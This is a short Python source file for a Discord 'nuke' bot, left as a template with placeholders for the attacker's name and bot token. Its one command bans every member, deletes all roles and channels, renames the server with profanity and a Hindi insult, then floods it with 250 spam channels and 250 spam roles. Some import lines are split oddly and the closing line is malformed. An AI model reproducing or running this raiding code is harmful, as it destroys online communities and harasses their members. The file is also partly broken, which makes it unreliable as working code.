import discord
from discord.ext 
import commands
from discord 
import Webhook, AsyncWebhookAdapter
from aiohttp 
import ClientSession
import aiohttp
import keep_alive
import jishaku


intents = discord.Intents.all()
bot = commands.Bot(command_prefix = 'prefix', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}({bot.user.id})')

@bot.command(aliases=["nuke command"])
@commands.guild_only()
async def baap(ctx):
    for member in ctx.guild.members:
        try:
            await member.ban()
        except:
            continue
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            continue
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            continue
    try:
        await ctx.guild.edit(
            name="Fucked by YOUR NAME™",
            description="MAA CHOD DENGE",
            reason="SERVER FUCKED BY YOUR NAME™",
            icon=None,
            banner=None
        )  
    except:
        pass
    try:    
        for _i in range(250):
            await ctx.guild.create_text_channel(name="your name")
    except:
        pass
    try:
        for _i in range(250):
            await ctx.guild.create_role(name="your name", color=0xF00A0A)
    except:
        pass


bot.load_extension('token here')  
